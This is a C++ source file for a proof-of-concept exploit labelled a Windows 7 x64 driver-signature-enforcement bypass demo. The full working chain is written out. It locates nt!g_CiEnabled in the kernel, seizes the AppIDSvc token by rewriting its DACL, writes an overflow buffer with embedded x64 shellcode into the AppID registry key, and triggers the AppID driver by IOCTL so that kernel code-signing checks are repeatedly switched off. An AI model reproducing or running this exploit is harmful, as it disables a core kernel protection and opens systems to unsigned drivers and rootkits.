// win7X64DSEBypass.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "winioctl.h"
#include "AccCtrl.h"
#include "Aclapi.h"
#include "shlwapi.h"
#include "psapi.h"
#pragma comment(lib , "psapi.lib")
#pragma comment(lib , "shlwapi.lib")

typedef NTSTATUS (NTAPI *PNT_QUERY_SYSTEM_INFORMATION)(ULONG SystemInformationClass , PVOID SystemInformation , ULONG SystemInformationLength , PULONG ReturnLength);
#define SystemModuleInformation 11

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;                 // Not filled in
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
PNT_QUERY_SYSTEM_INFORMATION pNtQuerySystemInformation;


BOOL GetNtoskrnlBase(PULONG_PTR NtoskrnlBase)
{
	pNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandleA("ntdll.dll") , "NtQuerySystemInformation");
	DWORD ReturnLength ; 
	RTL_PROCESS_MODULES ModuleInfo;

	if (pNtQuerySystemInformation == NULL)
	{		
		return FALSE ; 
	}

	memset(&ModuleInfo , 0 , sizeof(ModuleInfo));

	pNtQuerySystemInformation(SystemModuleInformation , &ModuleInfo , sizeof(ModuleInfo) , &ReturnLength  );

	if (ModuleInfo.NumberOfModules != 0 && ModuleInfo.Modules[0].ImageBase != 0)
	{
		*NtoskrnlBase = (ULONG_PTR)ModuleInfo.Modules[0].ImageBase;
		return TRUE ; 
	}
	else
	{
		return FALSE ; 
	}
}


BOOL FindNtoskrnlAddress(PULONG_PTR pgCiEnabled , PULONG_PTR pKeDelayExecutionThread)
{
	WCHAR System32Dir[MAX_PATH];
	WCHAR NtkrnlPath[MAX_PATH] ;
	MODULEINFO modinfo ; 
	HMODULE hlibnt;
	ULONG i , j; 
	ULONG gCiEnabledOffset ; 
	ULONG_PTR Ntbase ; 

	if (GetNtoskrnlBase(&Ntbase) == FALSE)
	{
		printf("[-] cannot find image base of ntoskrnl!\n");
		return FALSE ; 
	}

	if (GetSystemDirectory(System32Dir , MAX_PATH) == 0 )
	{
		printf("[-] Can not get system32 directory\n");
		return FALSE ; 
	}

	if (PathCombine(NtkrnlPath , System32Dir , L"ntoskrnl.exe") == NULL)
	{
		return FALSE ; 
	}

	hlibnt = LoadLibraryExW(NtkrnlPath , 0 , DONT_RESOLVE_DLL_REFERENCES);

	if (hlibnt == 0 )
	{
		printf("cannot load NTOSKRNL\n");
		return FALSE ; 
	}

	if (GetModuleInformation(GetCurrentProcess() , hlibnt , &modinfo , sizeof(MODULEINFO)) == FALSE)
	{
		printf("cannot get module information for NTOSKRNL\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	for (i = 0 ; i < modinfo.SizeOfImage - 6 ; i ++)
	{
		if ((i & (0x1000 -1)) ==0 &&
			IsBadReadPtr((PVOID)((ULONG_PTR)hlibnt + i) , 1))
		{
			i += 0x1000 ; 
			continue;
		}

		if (*(DWORD*)((ULONG_PTR)hlibnt + i ) == 0x0FD2854D )
		{
			if (*(WORD*)((ULONG_PTR)hlibnt + i - 0x7) == 0x8B4C &&
				*(BYTE*)((ULONG_PTR)hlibnt + i - 0x5) == 0x15 &&
				*(BYTE*)((ULONG_PTR)hlibnt + i + 4) == 0x84 &&
				*(WORD*)((ULONG_PTR)hlibnt + i + 9) == 0x8B48)
			{
				//find SeValidateImageHeader
				break ; 
			}
		}
		if (*(DWORD*)((ULONG_PTR)hlibnt + i) == 0x75D2854D)
		{
			if (*(WORD*)((ULONG_PTR)hlibnt + i - 0x7) == 0x8B4C &&
				*(BYTE*)((ULONG_PTR)hlibnt + i - 0x5) == 0x15)
			{
				//find SeValidateImageHeader
				break ; 
			}
		}
	}

	if (i != modinfo.SizeOfImage - 6)
	{
		for (j = 0 ; j < 0x40 ; j ++)
		{
			if (*(WORD*)((ULONG_PTR)hlibnt + i - j ) == 0x3D80 &&
				*(BYTE*)((ULONG_PTR)hlibnt + i - j + 6) == 0)
			{
				gCiEnabledOffset = i - j + 7 + *(DWORD*)((ULONG_PTR)hlibnt + i - j + 2);
				if (gCiEnabledOffset < modinfo.SizeOfImage)
				{
					break ; 
				}
			}
		}

		if (j == 0x40)
		{
			printf("[-] cannot find nt!g_CiEnabled!\n");
		}
	}
	else
	{
		printf("[-] cannot find nt!SeValidateImageHeader!\n");
		return 0 ;
	}

	PVOID pKeDelayLibOff = GetProcAddress(hlibnt , "KeDelayExecutionThread");

	if (pKeDelayLibOff == 0 )
	{
		printf("[-] cannot find address of KeDelayExecutionThread!\n");
		return 0 ; 
	}

	*pKeDelayExecutionThread = (ULONG_PTR)pKeDelayLibOff - (ULONG_PTR)hlibnt + Ntbase ; 

	*pgCiEnabled = Ntbase + gCiEnabledOffset;

	return TRUE ; 
}

BOOL IsProcessInSystemAccount()
{
	HANDLE tokenhandle ; 
	PTOKEN_USER ptu ; 
	DWORD retlen ; 
	SID LocalSystemSid ; 

	if (OpenProcessToken(GetCurrentProcess() , TOKEN_QUERY , &tokenhandle) == FALSE)
	{
		printf("[-] cannot open token %u\n" , GetLastError());
		return FALSE; 
	}

	if (GetTokenInformation(tokenhandle , TokenUser , NULL , 0 , &retlen) == FALSE && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		CloseHandle(tokenhandle);
		printf("[-] cannot get token user information %u\n",GetLastError());
		return FALSE ; 
	}

	ptu = (PTOKEN_USER)VirtualAlloc(0 , retlen , MEM_COMMIT , PAGE_READWRITE);

	if (ptu == 0)
	{
		printf("[-] Allocate %u bytes memory failed\n", retlen);
		CloseHandle(tokenhandle);
		return FALSE ; 
	}

	if (GetTokenInformation(tokenhandle , TokenUser , ptu , retlen , &retlen) == FALSE)
	{
		VirtualFree(ptu , 0 , MEM_RELEASE);
		CloseHandle(tokenhandle);
		printf("[-] cannot get token user information %u\n",GetLastError());
		return FALSE ; 
	}

	CloseHandle(tokenhandle);

	DWORD cbsid = sizeof(LocalSystemSid);

	if (CreateWellKnownSid(WinLocalSystemSid , NULL , &LocalSystemSid , &cbsid) == FALSE)
	{
		VirtualFree(ptu , 0 , MEM_RELEASE);
		printf("[-] CreateWellKnownSid failed %u\n" ,GetLastError());
		return FALSE ; 
	}

	if (EqualSid(&LocalSystemSid , ptu->User.Sid) == FALSE)
	{
		VirtualFree(ptu , 0 , MEM_RELEASE);
		return FALSE ; 
	}

	VirtualFree(ptu , 0 , MEM_RELEASE);

	return TRUE ;
}

BOOL
EnableDebugPriv( LPSTR szPrivilege )
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if ( !OpenProcessToken( GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken ) )
	{
		return FALSE;
	}
	if ( !LookupPrivilegeValueA( NULL, szPrivilege, &sedebugnameValue ) )
	{
		CloseHandle( hToken );
		return FALSE;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tkp, sizeof tkp, NULL, NULL ) )
	{
		CloseHandle( hToken );
		return FALSE;
	}

	return TRUE;
}

DWORD GetAPPIDSvcPid()
{
	SC_HANDLE sc_handle = OpenSCManager(NULL , NULL , SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT );
	SC_HANDLE svc_handle ; 
	SERVICE_STATUS_PROCESS svcstatus ; 

	if (sc_handle == 0 )
	{
		printf("[-] cannot open sc manager %u\n" , GetLastError());
		return 0 ; 
	}

	svc_handle = OpenServiceA(sc_handle , "AppIDSvc" , SERVICE_QUERY_STATUS | SERVICE_START);

	if (svc_handle == 0 )
	{
		printf("[-] cannot open AppIDSvc service %u\n" , GetLastError());
		CloseServiceHandle(sc_handle);
		return 0 ; 
	}


	DWORD btn ; 

	if (QueryServiceStatusEx(svc_handle , SC_STATUS_PROCESS_INFO , (LPBYTE)&svcstatus , sizeof(SERVICE_STATUS_PROCESS) , &btn) == FALSE)
	{
		printf("[-] cannot get AppIDSvc process id %u\n" , GetLastError());
		CloseServiceHandle(sc_handle );
		CloseServiceHandle(svc_handle);
		return 0 ; 
	}

	if (svcstatus.dwCurrentState != SERVICE_RUNNING)
	{
		if (StartService(svc_handle , 0 , NULL) == FALSE)
		{
			printf("[-] AppId svc is stopped and fail to start it,err = %u\n" , GetLastError());
			CloseServiceHandle(sc_handle );
			CloseServiceHandle(svc_handle);
			return 0;
		}
		if (QueryServiceStatusEx(svc_handle , SC_STATUS_PROCESS_INFO , (LPBYTE)&svcstatus , sizeof(SERVICE_STATUS_PROCESS) , &btn) == FALSE)
		{
			printf("[-] cannot get AppIDSvc process id %u\n" , GetLastError());
			CloseServiceHandle(sc_handle );
			CloseServiceHandle(svc_handle);
			return 0 ; 
		}
	}



	CloseServiceHandle(sc_handle );
	CloseServiceHandle(svc_handle);
	return svcstatus.dwProcessId ; 

}
BOOL CreateProcessWithAPPIDToken(LPSTR CommandLine)
{
	HANDLE hProcess;
	HANDLE hToken, hNewToken;
	DWORD dwPid;

	PACL pOldDAcl = NULL;
	PACL pNewDAcl = NULL;
	BOOL bDAcl;
	BOOL bDefDAcl;
	DWORD dwRet;

	PACL pSacl = NULL;
	PSID pSidOwner = NULL;
	PSID pSidPrimary = NULL;
	DWORD dwAclSize = 0;
	DWORD dwSaclSize = 0;
	DWORD dwSidOwnLen = 0;
	DWORD dwSidPrimLen = 0;

	DWORD dwSDLen;
	EXPLICIT_ACCESSA ea;
	PSECURITY_DESCRIPTOR pOrigSd = NULL;
	PSECURITY_DESCRIPTOR pNewSd = NULL;

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	BOOL bError;

	if ( !EnableDebugPriv( "SeDebugPrivilege" ) )
	{
		printf( "[-] EnableDebugPriv() failed %u!\n", GetLastError() );

		bError = TRUE;
		goto Cleanup;
	}

	if ( ( dwPid = GetAPPIDSvcPid( ) ) == NULL )
	{
		printf( "[-] GetAPPIDSvcPid() failed!\n" );   

		bError = TRUE;
		goto Cleanup;
	}

	printf("[+] AppIDSvc pid = %u\n" , dwPid);

	hProcess = OpenProcess( PROCESS_QUERY_INFORMATION , FALSE, dwPid );
	if ( hProcess == NULL )
	{
		printf( "[-] OpenProcess() = %u\n", GetLastError() );   

		bError = TRUE;
		goto Cleanup;
	}

	if ( !OpenProcessToken( hProcess, READ_CONTROL | WRITE_DAC, &hToken ) )
	{
		printf( "[-] OpenProcessToken() = %u\n", GetLastError() );

		bError = TRUE;
		goto Cleanup;
	}

	ZeroMemory( &ea, sizeof( EXPLICIT_ACCESSA ) );
	BuildExplicitAccessWithNameA( &ea,
		"Everyone",
		TOKEN_ALL_ACCESS,
		GRANT_ACCESS,
		0 );

	if ( !GetKernelObjectSecurity( hToken,
		DACL_SECURITY_INFORMATION,
		pOrigSd,
		0,
		&dwSDLen ) )
	{
		if ( GetLastError() == ERROR_INSUFFICIENT_BUFFER )
		{
			pOrigSd = ( PSECURITY_DESCRIPTOR ) HeapAlloc( GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				dwSDLen );
			if ( pOrigSd == NULL )
			{
				printf( "[-] Allocate pSd memory failed!\n" );

				bError = TRUE;
				goto Cleanup;
			}

			if ( !GetKernelObjectSecurity( hToken,
				DACL_SECURITY_INFORMATION,
				pOrigSd,
				dwSDLen,
				&dwSDLen ) )
			{
				printf( "[-] GetKernelObjectSecurity() = %u\n", GetLastError() );
				bError = TRUE;
				goto Cleanup;
			}
		}
		else
		{
			printf( "[-] GetKernelObjectSecurity() = %u\n", GetLastError() );
			bError = TRUE;
			goto Cleanup;
		}
	}


	if ( !GetSecurityDescriptorDacl( pOrigSd, &bDAcl, &pOldDAcl, &bDefDAcl ) )
	{
		printf( "[-] GetSecurityDescriptorDacl() = %u\n", GetLastError() );

		bError = TRUE;
		goto Cleanup;
	}

	dwRet = SetEntriesInAclA( 1, &ea, pOldDAcl, &pNewDAcl ); 
	if ( dwRet != ERROR_SUCCESS )
	{
		printf( "[-] SetEntriesInAcl() = %u\n", GetLastError() ); 
		pNewDAcl = NULL;

		bError = TRUE;
		goto Cleanup;
	} 

	if ( !MakeAbsoluteSD( pOrigSd,
		pNewSd,
		&dwSDLen,
		pOldDAcl,
		&dwAclSize,
		pSacl,
		&dwSaclSize,
		pSidOwner,
		&dwSidOwnLen,
		pSidPrimary,
		&dwSidPrimLen ) )
	{
		if ( GetLastError() == ERROR_INSUFFICIENT_BUFFER )
		{
			pOldDAcl = ( PACL ) HeapAlloc( GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				dwAclSize );
			pSacl = ( PACL ) HeapAlloc( GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				dwSaclSize );
			pSidOwner = ( PSID ) HeapAlloc( GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				dwSidOwnLen );
			pSidPrimary = ( PSID ) HeapAlloc( GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				dwSidPrimLen );
			pNewSd = ( PSECURITY_DESCRIPTOR ) HeapAlloc( GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				dwSDLen );

			if ( pOldDAcl == NULL ||
				pSacl == NULL ||
				pSidOwner == NULL ||
				pSidPrimary == NULL ||
				pNewSd == NULL )
			{
				printf( "[-] Allocate SID or ACL to failed!\n" );

				bError = TRUE;
				goto Cleanup;
			}

			if ( !MakeAbsoluteSD( pOrigSd,
				pNewSd,
				&dwSDLen,
				pOldDAcl,
				&dwAclSize,
				pSacl,
				&dwSaclSize,
				pSidOwner,
				&dwSidOwnLen,
				pSidPrimary,
				&dwSidPrimLen ) )
			{
				printf( "[-] MakeAbsoluteSD() = %u\n", GetLastError() );

				bError = TRUE;
				goto Cleanup;
			}
		}
		else
		{
			printf( "[-] MakeAbsoluteSD() = %u\n", GetLastError() );

			bError = TRUE;
			goto Cleanup;
		}
	}

	if ( !SetSecurityDescriptorDacl( pNewSd, bDAcl, pNewDAcl, bDefDAcl ) )
	{
		printf( "[-] SetSecurityDescriptorDacl() = %u\n", GetLastError() );

		bError = TRUE;
		goto Cleanup;
	}

	if ( !SetKernelObjectSecurity( hToken, DACL_SECURITY_INFORMATION, pNewSd ) )
	{
		printf( "[-] SetKernelObjectSecurity() = %u\n", GetLastError() );

		bError = TRUE;
		goto Cleanup;
	}

	if ( !OpenProcessToken( hProcess, TOKEN_ALL_ACCESS, &hToken ) )
	{
		printf( "[-] OpenProcessToken() = %u\n", GetLastError() );   

		bError = TRUE;
		goto Cleanup;
	}

	if ( !DuplicateTokenEx( hToken,
		TOKEN_ALL_ACCESS,
		NULL,
		SecurityImpersonation,
		TokenPrimary,
		&hNewToken ) )
	{
		printf( "[-] DuplicateTokenEx() = %u\n", GetLastError() );   

		bError = TRUE;
		goto Cleanup;
	}


	ZeroMemory( &si, sizeof( STARTUPINFOA ) );
	si.cb = sizeof( STARTUPINFOA );
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);


	ImpersonateLoggedOnUser( hNewToken );


	if ( !CreateProcessAsUserA( hNewToken,
		NULL,
		CommandLine,
		NULL,
		NULL,
		FALSE,
		NULL, //NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi ) )
	{
		printf( "[-] CreateProcessAsUser() = %u\n", GetLastError() );   

		bError = TRUE;
		goto Cleanup;
	}

	bError = FALSE;

Cleanup:
	if ( pOrigSd )
	{
		HeapFree( GetProcessHeap(), 0, pOrigSd );
	}
	if ( pNewSd )
	{
		HeapFree( GetProcessHeap(), 0, pNewSd );
	}
	if ( pSidPrimary )
	{
		HeapFree( GetProcessHeap(), 0, pSidPrimary );
	}
	if ( pSidOwner )
	{
		HeapFree( GetProcessHeap(), 0, pSidOwner );
	}
	if ( pSacl )
	{
		HeapFree( GetProcessHeap(), 0, pSacl );
	}
	if ( pOldDAcl )
	{
		HeapFree( GetProcessHeap(), 0, pOldDAcl );
	}

	CloseHandle( hToken );
	CloseHandle( hNewToken );
	CloseHandle( hProcess );

	if ( bError )
	{
		return FALSE;
	}

	WaitForSingleObject(pi.hProcess , INFINITE);

	CloseHandle( pi.hProcess );
	CloseHandle( pi.hThread );

	return TRUE;	
}

CHAR WorkMask[] = "work";

BOOL RunningMySelfAsAppIDSVC()
{
	CHAR Path[MAX_PATH];
	CHAR cmdline[MAX_PATH];

	GetModuleFileNameA(0 , Path , MAX_PATH);

	if (strlen(Path) + sizeof(WorkMask) + 3 > MAX_PATH)
	{
		return FALSE ; 
	}

	sprintf(cmdline , "\"%s\" %s" , Path , WorkMask);

	if (IsProcessInSystemAccount() == FALSE)
	{
		printf("[-] You must run this program with Psexec -s\n");
		return FALSE ; 
	}
	
	if (CreateProcessWithAPPIDToken(cmdline) == FALSE)
	{
		printf("[-] can not create process with AppIDSvc\n");
		return FALSE ; 
	}

	return TRUE ; 

}
#define IOCTL_APPID_READ_CONFIG_OPTIONS CTL_CODE(FILE_DEVICE_UNKNOWN , 0x804 , METHOD_BUFFERED , FILE_WRITE_ACCESS)

WCHAR AppIdSvcKey[] = L"SYSTEM\\CurrentControlSet\\Control\\AppID";
WCHAR ValueName[] = L"EnablePath";


unsigned char StackData[368] = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
};


BYTE ShellCode[] = {
	0x4C , 0x8D , 0x05 , 0x18 , 0x00 , 0x00 , 0x00 ,					 //L1:	LEA R8  , L2
	0x33 , 0xD2 ,														 //		XOR EDX , EDX
	0x33 , 0xC9 ,														 //		XOR ECX , ECX
	0x48 , 0xB8 , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB, //		MOV RAX , 0xBBBBBBBBBBBBBBBB//nt!g_CiEnabled
	0x89 , 0x08 ,														 //		MOV [RAX] , ECX
	0xFF , 0x15 , 0x0A , 0x00 , 0x00 , 0x00 ,							 //		CALL L3
	0xEB , 0xE1 ,														 //		JMP  L1
	0x00 , 0xBA , 0x3C , 0xDC , 0xFF , 0xFF , 0xFF , 0xFF,				 //L2:	=-600000000 = 60secs
	0xAA , 0xAA , 0xAA , 0xAA , 0xAA , 0xAA , 0xAA , 0xAA				 //L3:	=KeDelayExecutionThread 0xAAAAAAAAAAAAAAAA
};


PVOID WriteAppIdRegistry(ULONG_PTR gCiEnabledAddress , ULONG_PTR KeDelayExecutionThreadAddress)
{
	HKEY hkey ;
	PVOID pKeyDataBuffer ; 
	DWORD i ; 

	pKeyDataBuffer = VirtualAlloc(NULL , 0x1000 , MEM_COMMIT , PAGE_EXECUTE_READWRITE);

	if (pKeyDataBuffer == NULL)
	{
		printf("[-] Allocate 0x1000 bytes buffer failed!\n");
		return NULL ; 
	}

	memcpy(pKeyDataBuffer , StackData , 0x170);

	*(ULONG_PTR*)((ULONG_PTR)pKeyDataBuffer + 0x170) = (ULONG_PTR)pKeyDataBuffer + 0x178 ; 

	memcpy((PVOID)((ULONG_PTR)pKeyDataBuffer + 0x178) , ShellCode , sizeof(ShellCode));

	for (i = 0 ; i < sizeof(ShellCode ) ; i ++)
	{
		if (*(ULONG_PTR*)((ULONG_PTR)pKeyDataBuffer + 0x178 + i ) == 0xAAAAAAAAAAAAAAAA)
		{
			*(ULONG_PTR*)((ULONG_PTR)pKeyDataBuffer + 0x178 + i ) = KeDelayExecutionThreadAddress ; 
		}
		if (*(ULONG_PTR*)((ULONG_PTR)pKeyDataBuffer + 0x178 + i ) == 0xBBBBBBBBBBBBBBBB)
		{
			*(ULONG_PTR*)((ULONG_PTR)pKeyDataBuffer + 0x178 + i ) = gCiEnabledAddress;
		}
	}

	
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE , AppIdSvcKey , 0 , KEY_WRITE , &hkey) != ERROR_SUCCESS)
	{
		printf("[-] Cannot open AppID service key!\n");
		VirtualFree(pKeyDataBuffer , 0 , MEM_RELEASE);
		return NULL ; 
	}

	if (RegSetValueExW(hkey , ValueName , 0 , REG_BINARY , (BYTE*)pKeyDataBuffer , 0x178 ) != ERROR_SUCCESS)
	{
		printf("-] Cannot set registry key value!\n");
		RegCloseKey(hkey);
		VirtualFree(pKeyDataBuffer , 0 , MEM_RELEASE);
		return NULL ; 
	}

	RegCloseKey(hkey);

	return pKeyDataBuffer ; 
}


int _tmain(int argc, _TCHAR* argv[])
{
	
	if (argc == 1)
	{

		RunningMySelfAsAppIDSVC();
	}
	else
	{
		printf("[+] Windows7 x64 DSE Bypass Demo by MJ0011\n"
			"[+] E-mail: th_decoder@126.com\n");

		if (wcscmp((wchar_t*)argv[1] , L"work") == 0 )
		{
			ULONG_PTR AddressOfKeDelayExecutionThread ; 
			ULONG_PTR AddressOfgCiEnabled ; 
			DWORD btr ; 
			PVOID ShellCodeBuffer ; 

			if (FindNtoskrnlAddress(&AddressOfgCiEnabled , &AddressOfKeDelayExecutionThread) == FALSE)
			{
				return 0 ; 
			}

			printf("[+] Find nt!g_CiEnabled = %I64x\n" , AddressOfgCiEnabled);

			ShellCodeBuffer = WriteAppIdRegistry(AddressOfgCiEnabled , AddressOfKeDelayExecutionThread);

			if (ShellCodeBuffer)
			{
				printf("[+] Write Registry Key Value OK!\n");
			}
			else
			{
				printf("[-] Write Registry Key Value failed!\n");
			}

			HANDLE hdev = CreateFileA("\\\\.\\AppID" , FILE_WRITE_DATA , FILE_SHARE_READ , NULL , OPEN_EXISTING , 0 , 0 );

			if (hdev == INVALID_HANDLE_VALUE)
			{
				VirtualFree(ShellCodeBuffer , 0 , MEM_RELEASE);
				printf("Open AppID failed err = %u\n" , GetLastError());
				return 0 ; 
			}


			printf("[+] Modify nt!gCiEnabled!\n");

			if (DeviceIoControl(hdev ,  IOCTL_APPID_READ_CONFIG_OPTIONS , NULL , 0 , NULL , 0 , &btr , 0 ) == FALSE)
			{
				VirtualFree(ShellCodeBuffer , 0 , MEM_RELEASE);
				CloseHandle(hdev);
				return 0 ; 
			}

			VirtualFree(ShellCodeBuffer , 0 , MEM_RELEASE);
			CloseHandle(hdev);
		}
	}

	return 0;
}

